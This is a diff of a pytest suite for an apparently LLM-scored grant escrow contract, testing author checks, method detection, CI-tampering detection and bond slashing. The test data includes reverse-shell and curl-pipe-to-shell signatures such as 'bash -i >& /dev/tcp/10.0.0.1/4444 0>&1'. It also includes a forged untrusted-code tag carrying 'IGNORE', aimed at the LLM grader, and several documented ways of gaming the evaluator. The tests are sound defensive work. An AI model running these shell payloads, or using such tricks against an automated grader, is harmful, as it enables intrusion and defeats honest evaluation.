@@ -145,7 +145,7 @@ def test_foreign_repo_commit_rejected(env):
     gid, r = go(env, 95, handle="alice", report=good_report(), author_login="bob",
                 committer_login="bob")
     g = env[0].get_grant(gid)
-    assert r == "DISPUTED" and "ERR_PROVENANCE_MISMATCH" in g["audit_report"]
+    assert r == "DISPUTED" and "ERR_UNAUTHORIZED_AUTHOR" in g["audit_report"]
 
 
 def test_foreign_repo_commit_refunds_bond_and_locks_escrow(env):
@@ -154,22 +154,63 @@ def test_foreign_repo_commit_refunds_bond_and_locks_escrow(env):
     assert env[0].get_protocol_metrics()["locked_escrow"] == str(GRANT)
 
 
-def test_repo_owner_matching_handle_is_enough(env):
+def test_foreign_author_in_developers_repo_rejected(env):
+    """Issue #1: the repo owner IS the developer, but a third party wrote the commit."""
+    gid, r = go(env, 95, handle="acme", report=good_report(), author_login="somebody",
+                committer_login="somebody")
+    g = env[0].get_grant(gid)
+    assert r == "DISPUTED" and "ERR_UNAUTHORIZED_AUTHOR" in g["audit_report"]
+    assert bal(env, env[3]) == BOND and g["evaluated"] is False
+
+
+def test_repo_owner_alone_is_not_enough(env):
     gid, r = go(env, 95, handle="ACME", report=good_report(), author_login="somebody",
                 committer_login="web-flow")
-    assert r == "APPROVED"  # case-insensitive, repo owner == developer handle
+    assert r == "DISPUTED"
+
+
+def test_upstream_commit_merged_into_developers_fork_rejected(env):
+    """Upstream author, developer pushed it: committer matches, author does not."""
+    gid, r = go(env, 95, handle="acme", report=good_report(), author_login="upstream-dev",
+                committer_login="acme")
+    assert r == "DISPUTED" and "ERR_UNAUTHORIZED_AUTHOR" in env[0].get_grant(gid)["audit_report"]
+
+
+def test_third_party_committer_rejected(env):
+    gid, r = go(env, 95, handle="acme", report=good_report(), author_login="acme",
+                committer_login="mallory")
+    assert r == "DISPUTED" and "ERR_UNAUTHORIZED_AUTHOR" in env[0].get_grant(gid)["audit_report"]
+
+
+def test_unlinked_author_in_developers_own_repo_rejected(env):
+    gid, r = go(env, 95, handle="acme", report=good_report(), author_login=None,
+                committer_login=None)
+    assert r == "DISPUTED"
+
+
+def test_author_binding_is_case_insensitive(env):
+    gid, r = go(env, 95, handle="AcMe", report=good_report(), author_login="ACME",
+                committer_login="acme")
+    assert r == "APPROVED"
+
+
+def test_web_flow_committer_is_accepted(env):
+    """Commits made through the GitHub web UI are committed by web-flow."""
+    gid, r = go(env, 95, handle="acme", report=good_report(), author_login="acme",
+                committer_login="web-flow")
+    assert r == "APPROVED"
+
+
+def test_web_flow_cannot_stand_in_for_the_author(env):
+    gid, r = go(env, 95, handle="acme", report=good_report(), author_login="web-flow",
+                committer_login="web-flow")
+    assert r == "DISPUTED"
 
 
 def test_author_and_committer_in_foreign_repo_is_enough(env):
     gid, r = go(env, 95, handle="carol", report=good_report(), author_login="Carol",
                 committer_login="carol")
-    assert r == "APPROVED"
-
-
-def test_author_alone_in_foreign_repo_is_not_enough(env):
-    gid, r = go(env, 95, handle="carol", report=good_report(), author_login="carol",
-                committer_login="web-flow")
-    assert r == "DISPUTED" and "ERR_PROVENANCE_MISMATCH" in env[0].get_grant(gid)["audit_report"]
+    assert r == "APPROVED"  # repo ownership is irrelevant either way
 
 
 def test_committer_alone_in_foreign_repo_is_not_enough(env):
@@ -187,7 +228,7 @@ def test_unlinked_author_in_foreign_repo_is_rejected(env):
 def test_provenance_is_checked_before_freshness(env):
     gid, r = go(env, 95, handle="alice", report=good_report(), author_login="bob",
                 committer_login="bob", author_date=PAST, committer_date=PAST)
-    assert "ERR_PROVENANCE_MISMATCH" in env[0].get_grant(gid)["audit_report"]
+    assert "ERR_UNAUTHORIZED_AUTHOR" in env[0].get_grant(gid)["audit_report"]
 
 
 def test_provenance_failure_does_not_call_the_model(env):
@@ -204,12 +245,11 @@ def test_provenance_failure_is_consensus_deterministic(env):
     assert env[1].run_validator() is True
 
 
-def test_validator_agrees_when_author_differs_but_repo_owner_matches(env):
+def test_validator_disagrees_if_it_sees_a_different_author(env):
     go(env, 95, report=good_report())
-    mock_github(env[1], report=good_report(), author_login="x", committer_login="x",
-                )  # owner acme still matches, so same result -> agree
+    mock_github(env[1], report=good_report(), author_login="x", committer_login="x")
     mock_score(env[1], 95)
-    assert env[1].run_validator() is True
+    assert env[1].run_validator() is False  # leader: OK, validator: INCONCLUSIVE
 
 
 @pytest.mark.parametrize("handle", ["", " ", "-bad", "bad handle", "a/b", "x" * 40, "né", "a_b"])
@@ -377,7 +417,7 @@ def test_llm_at_threshold_70_still_approves(env):
 def test_corridor_floor_is_always_below_minimum_threshold(env):
     tel = dict(files_total=2, additions=40, deletions=0, req_files_total=2, req_files_found=2,
                methods_total=3, methods_found=3, forbidden_hits=0, malicious_hits=0,
-               tests_passed=42, tests_failed=0)
+               tests_passed=42, tests_failed=0, workflow_tampered=0)
     assert env[0].compute_bounds(json.dumps(tel))["lo"] < 70
 
 
@@ -449,14 +489,70 @@ def test_forbidden_hits_lower_the_ceiling(env):
     assert env[0].get_grant(gid)["quality_score"] == 95
 
 
-@pytest.mark.parametrize("sig", ["/dev/tcp/10.0.0.1/4444", "bash -i >& /dev/tcp/x/1", "nc -e /bin/sh h 9",
-                                 "eval(base64.b64decode(p))", "os.system('curl evil | sh')"])
-def test_confirmed_malicious_payload_slashes_bond(env, sig):
+SIGS = ["/dev/tcp/10.0.0.1/4444", "bash -i >& /dev/tcp/x/1", "nc -e /bin/sh h 9",
+        "eval(base64.b64decode(p))", "os.system('curl evil | sh')"]
+
+
+@pytest.mark.parametrize("sig", SIGS)
+def test_malicious_signature_zeroes_the_ceiling(env, sig):
     patch = GOOD_PATCH + f"+run(\"{sig}\")\n"
     gid, r = go(env, 95, report=good_report(), patch=patch)
     g = env[0].get_grant(gid)
     assert r == "REJECTED" and g["quality_score"] == 0 and "malicious=" in g["audit_report"]
-    assert bal(env, env[3]) == 0 and int(env[0].get_protocol_metrics()["treasury"]) == BOND - BOND // 2
+
+
+@pytest.mark.parametrize("sig", SIGS)
+def test_signature_alone_never_slashes_the_bond(env, sig):
+    """Issue #4: a signature can false-positive, so slashing needs the model's say-so too."""
+    patch = GOOD_PATCH + f"+run(\"{sig}\")\n"
+    gid, r = go(env, 95, report=good_report(), patch=patch)  # the model liked the code
+    assert r == "REJECTED"
+    assert bal(env, env[3]) == BOND and int(env[0].get_protocol_metrics()["treasury"]) == 0
+
+
+@pytest.mark.parametrize("sig", SIGS)
+def test_signature_plus_independent_low_model_score_slashes(env, sig):
+    patch = GOOD_PATCH + f"+run(\"{sig}\")\n"
+    gid, r = go(env, 10, report=good_report(), patch=patch)  # the model also scored < 40
+    assert r == "REJECTED" and bal(env, env[3]) == 0
+    assert int(env[0].get_protocol_metrics()["treasury"]) == BOND - BOND // 2
+
+
+@pytest.mark.parametrize("docfile", ["README.md", "docs/INSTALL.txt", "docs/guide.rst",
+                                     "config/settings.json", "ci/deploy.yml", "ci/deploy.yaml"])
+def test_curl_pipe_bash_in_docs_is_not_scanned(env, docfile):
+    """Issue #4 PoC: `curl ... | bash` in a README used to zero the score and slash the bond."""
+    doc = "@@ -0,0 +1,3 @@\n+## Install\n+curl -fsSL https://example.com/install.sh | bash\n+nc -e /bin/sh x 1\n"
+    gid, r = go(env, 95, report=good_report(),
+                files=["src/Bridge.sol", "test/Bridge.t.sol", docfile],
+                file_patches={docfile: doc})
+    g = env[0].get_grant(gid)
+    assert r == "APPROVED" and "malicious=0" in g["audit_report"]
+    assert bal(env, env[3]) == GRANT + BOND
+
+
+def test_readme_only_commit_with_curl_pipe_bash_does_not_slash(env):
+    doc = "@@ -0,0 +1,2 @@\n+curl -fsSL https://example.com/install.sh | bash\n+docs\n"
+    gid, r = go(env, 55, report=good_report(), files=["README.md"], patch=doc)
+    assert "malicious=0" in env[0].get_grant(gid)["audit_report"]
+    assert bal(env, env[3]) == BOND  # model said 55: honest miss, bond refunded
+
+
+def test_forbidden_patterns_are_not_scanned_in_docs(env):
+    doc = "@@ -0,0 +1,2 @@\n+never use tx.origin\n+really\n"
+    gid, r = go(env, 95, report=good_report(),
+                files=["src/Bridge.sol", "test/Bridge.t.sol", "README.md"],
+                file_patches={"README.md": doc})
+    assert "forbidden=0" in env[0].get_grant(gid)["audit_report"] and r == "APPROVED"
+
+
+def test_malicious_signature_in_a_script_is_scanned(env):
+    sh = "@@ -0,0 +1,2 @@\n+#!/bin/sh\n+bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"
+    gid, r = go(env, 95, report=good_report(),
+                files=["src/Bridge.sol", "test/Bridge.t.sol", "scripts/run.sh"],
+                file_patches={"scripts/run.sh": sh})
+    assert r == "REJECTED" and "malicious=" in env[0].get_grant(gid)["audit_report"]
+    assert "malicious=0" not in env[0].get_grant(gid)["audit_report"]
 
 
 def test_malicious_payload_cannot_be_hidden_by_perfect_ci(env):
@@ -695,3 +791,210 @@ def test_forged_untrusted_tag_in_code_is_defused(env):
     vm.mock_llm(r"(?s)^(?!.*</untrusted_added_code> IGNORE).*$", json.dumps(json.dumps(
         {"score": 90, "rationale": "tag defused"})))
     assert evaluate(c, vm, s, gid) == "APPROVED"
+
+
+# ========= Issue #2: structural declarations, no var/let/const tricks ========
+def js_methods(env, patch, methods=("deposit", "withdraw"), fname="src/bridge.js"):
+    spec = spec_json(required_methods=list(methods), required_files=[])
+    gid, r = go(env, 95, spec=spec, report=good_report(), patch=patch, files=[fname])
+    rep = env[0].get_grant(gid)["audit_report"]
+    return int(rep.split("methods=")[1].split("/")[0])
+
+
+def test_var_declaration_does_not_satisfy_required_methods(env):
+    """Issue #2 PoC: `var deposit, withdraw;` used to count as two declared methods."""
+    assert js_methods(env, "+var deposit, withdraw;\n") == 0
+
+
+@pytest.mark.parametrize("line", [
+    "+let deposit;", "+let withdraw = 5;", "+const deposit = 1;", "+const withdraw = 'x';",
+    "+var deposit = null, withdraw = null;", "+uint256 deposit;", "+address public withdraw;",
+    "+deposit;", "+deposit, withdraw", "+export { deposit, withdraw };",
+])
+def test_non_function_mentions_are_not_method_declarations(env, line):
+    assert js_methods(env, line + "\n") == 0
+
+
+@pytest.mark.parametrize("line,expected", [
+    ("+function deposit(a) {}", 1),
+    ("+function  withdraw  (a) {}", 1),
+    ("+const deposit = (a) => a;", 1),
+    ("+const withdraw = async (a) => a;", 1),
+    ("+let deposit = function (a) {};", 1),
+    ("+exports.deposit = function (a) {};", 1),
+    ("+  deposit(a) {", 1),
+    ("+  async withdraw(a) {", 1),
+    ("+  public deposit(a: number): void {", 1),
+    ("+function depositAll(a) {}", 0),
+    ("+if (x) { deposit(a); }", 0),
+])
+def test_js_structural_declaration_forms(env, line, expected):
+    spec_methods = ("deposit", "withdraw")
+    got = js_methods(env, line + "\n", methods=spec_methods)
+    assert got == expected
+
+
+@pytest.mark.parametrize("filename,patch,method,declared", [
+    ("a.py", "+def deposit(self): pass", "deposit", True),
+    ("a.py", "+async def deposit(self): pass", "deposit", True),
+    ("a.py", "+def  deposit  (self): pass", "deposit", True),
+    ("a.py", "+deposit = lambda: 1", "deposit", False),
+    ("a.py", "+deposit = 5", "deposit", False),
+    ("a.py", "+class deposit: pass", "deposit", False),
+    ("a.py", "+def deposit_all(self): pass", "deposit", False),
+    ("a.py", "+x.deposit(5)", "deposit", False),
+    ("a.sol", "+function deposit() external;", "deposit", True),
+    ("a.sol", "+uint256 deposit;", "deposit", False),
+    ("a.sol", "+uint256 public deposit = 1;", "deposit", False),
+    ("a.sol", "+modifier nonReentrant() { _; }", "nonReentrant", True),
+    ("a.sol", "+function x() external nonReentrant {}", "nonReentrant", False),
+    ("a.ts", "+function deposit(a: number) {}", "deposit", True),
+    ("a.ts", "+interface I { deposit: number }", "deposit", False),
+    ("a.rs", "+pub fn deposit() {}", "deposit", True),
+    ("a.rs", "+let deposit = 1;", "deposit", False),
+    ("a.go", "+func (b *Bridge) deposit(x int) {}", "deposit", True),
+    ("a.go", "+var deposit int", "deposit", False),
+    ("a.rb", "+def deposit(x); end", "deposit", True),
+    ("a.sh", "+deposit() { echo; }", "deposit", True),
+    ("a.sh", "+function deposit { echo; }", "deposit", True),
+    ("README.md", "+def deposit(self): pass", "deposit", False),
+    ("notes.txt", "+function deposit() {}", "deposit", False),
+    ("data.json", '+{"function deposit(": 1}', "deposit", False),
+])
+def test_structural_declaration_matrix(env, filename, patch, method, declared):
+    assert env[0].preview_code(filename, patch, method)["declared"] is declared
+
+
+def test_methods_declared_only_in_docs_do_not_count(env):
+    c = env[0]
+    spec = spec_json(required_methods=["deposit"], required_files=[])
+    doc = "@@ -0,0 +1,2 @@\n+function deposit() {}\n+def deposit(self): pass\n"
+    gid, r = go(env, 95, spec=spec, report=good_report(), files=["README.md"], patch=doc)
+    assert "methods=0/1" in c.get_grant(gid)["audit_report"]
+
+
+# ===================== Issue #4: URLs are not comments =======================
+def test_safe_url_is_not_stripped_as_a_comment(env):
+    """The comment stripper used to treat `//` in `https://` as a line comment and drop the
+    rest of the line, hiding whatever followed."""
+    out = env[0].preview_code("a.js", "+fetch(https://api.example.com/v1); function deposit() {}",
+                              "deposit")
+    assert out["declared"] is True and "https://api.example.com/v1" in out["code"]
+
+
+@pytest.mark.parametrize("url", ["https://example.com/a", "http://example.com/a", "ftp://h/x",
+                                 "file:///etc/hosts", "wss://h/s"])
+def test_url_schemes_survive_stripping(env, url):
+    out = env[0].preview_code("a.js", f"+go({url}); function deposit() {{}}", "deposit")
+    assert url in out["code"] and out["declared"] is True
+
+
+def test_real_line_comment_after_a_url_is_still_stripped(env):
+    out = env[0].preview_code("a.js", "+go(https://e.com/a); // hidden note", "go")
+    assert "https://e.com/a" in out["code"] and "hidden note" not in out["code"]
+
+
+def test_plain_double_slash_comment_still_stripped(env):
+    out = env[0].preview_code("a.js", "+x = 1; // function deposit() {}", "deposit")
+    assert out["declared"] is False and "x = 1;" in out["code"]
+
+
+def test_forbidden_pattern_after_a_url_is_still_seen(env):
+    patch = GOOD_PATCH + "+go(https://e.com/a); require(tx.origin == owner);\n"
+    gid, r = go(env, 95, report=good_report(), patch=patch)
+    assert "forbidden=1" in env[0].get_grant(gid)["audit_report"]
+
+
+# ============== Issue #3: workflow edits void the commit's own CI ============
+WF = ".github/workflows/ci.yml"
+WF_PATCH = "@@ -0,0 +1,4 @@\n+on: push\n+jobs:\n+  t:\n+    steps: [{run: 'exit 0'}]\n"
+
+
+def test_workflow_edit_makes_ci_untrusted(env):
+    """A commit that rewrites its own workflow can print a green check; its CI counts as none."""
+    gid, r = go(env, 99, report=good_report(),
+                files=["src/Bridge.sol", "test/Bridge.t.sol", WF], file_patches={WF: WF_PATCH})
+    g = env[0].get_grant(gid)
+    assert r == "REJECTED" and g["quality_score"] <= 10
+    assert "ci=0ok/0fail" in g["audit_report"] and "workflow_edited=1" in g["audit_report"]
+
+
+def test_untrusted_ci_does_not_slash_by_itself(env):
+    gid, r = go(env, 80, report=good_report(),
+                files=["src/Bridge.sol", "test/Bridge.t.sol", WF], file_patches={WF: WF_PATCH})
+    assert bal(env, env[3]) == BOND  # model 80 >= 40: no forfeiture, just no approval
+
+
+@pytest.mark.parametrize("path", [".github/workflows/release.yaml", ".github/workflows/sub/x.yml"])
+def test_any_workflow_file_voids_ci(env, path):
+    gid, r = go(env, 99, report=good_report(),
+                files=["src/Bridge.sol", "test/Bridge.t.sol", path], file_patches={path: WF_PATCH})
+    assert "workflow_edited=1" in env[0].get_grant(gid)["audit_report"] and r == "REJECTED"
+
+
+def test_files_merely_named_like_workflows_do_not_void_ci(env):
+    gid, r = go(env, 95, report=good_report(),
+                files=["src/Bridge.sol", "test/Bridge.t.sol", "docs/.github/workflows-notes.md"])
+    assert "workflow_edited=0" in env[0].get_grant(gid)["audit_report"] and r == "APPROVED"
+
+
+def test_untouched_workflow_keeps_ci_trusted(env):
+    gid, r = go(env, 95, report=good_report())
+    assert "workflow_edited=0" in env[0].get_grant(gid)["audit_report"] and r == "APPROVED"
+
+
+def test_workflow_edit_skips_the_check_runs_request(env):
+    c, vm, a, b, s = env
+    gid = delivered(c, vm, a, b)
+    mock_github(vm, report=good_report(), files=["src/Bridge.sol", WF], file_patches={WF: WF_PATCH})
+    mock_score(vm, 90)
+    evaluate(c, vm, s, gid)
+    checks_mock = 0  # CHECKS is registered first by mock_github
+    assert checks_mock not in vm._web_mocks_hit
+
+
+def test_validator_disagrees_if_workflow_edit_differs(env):
+    go(env, 95, report=good_report())
+    mock_github(env[1], report=good_report(), files=["src/Bridge.sol", "test/Bridge.t.sol", WF],
+                file_patches={WF: WF_PATCH})
+    mock_score(env[1], 95)
+    assert env[1].run_validator() is False
+
+
+def test_compute_bounds_requires_workflow_flag(env):
+    tel = dict(files_total=2, additions=40, deletions=0, req_files_total=2, req_files_found=2,
+               methods_total=3, methods_found=3, forbidden_hits=0, malicious_hits=0,
+               tests_passed=42, tests_failed=0)
+    with env[1].expect_revert("ERR_INVALID_PARAMS"):
+        env[0].compute_bounds(json.dumps(tel))
+
+
+# =========== trust model: permissionless evaluation, developer first ========
+def test_anyone_including_the_developer_can_trigger_evaluation(env):
+    c, vm, a, b, s = env
+    gid = delivered(c, vm, a, b)
+    mock_github(vm, report=good_report())
+    mock_score(vm, 94)
+    assert evaluate(c, vm, b, gid) == "APPROVED"  # developer evaluates their own delivery
+
+
+def test_developer_evaluating_early_beats_the_funder_timeout(env):
+    c, vm, a, b, s = env
+    gid = delivered(c, vm, a, b)
+    mock_github(vm, report=good_report())
+    mock_score(vm, 94)
+    evaluate(c, vm, b, gid)
+    vm.warp("2099-06-01T00:00:00Z")
+    vm.sender = a
+    with vm.expect_revert("ERR_INVALID_STATE"):
+        c.cancel_stuck_delivery(gid)  # too late: the grant already settled
+    assert bal(env, b) == GRANT + BOND
+
+
+def test_funder_timeout_cancellation_when_nobody_evaluates(env):
+    c, vm, a, b, s = env
+    gid = delivered(c, vm, a, b)
+    vm.warp("2099-06-01T00:00:00Z")
+    vm.sender = a
+    c.cancel_stuck_delivery(gid)
+    assert bal(env, a) == GRANT and bal(env, b) == BOND
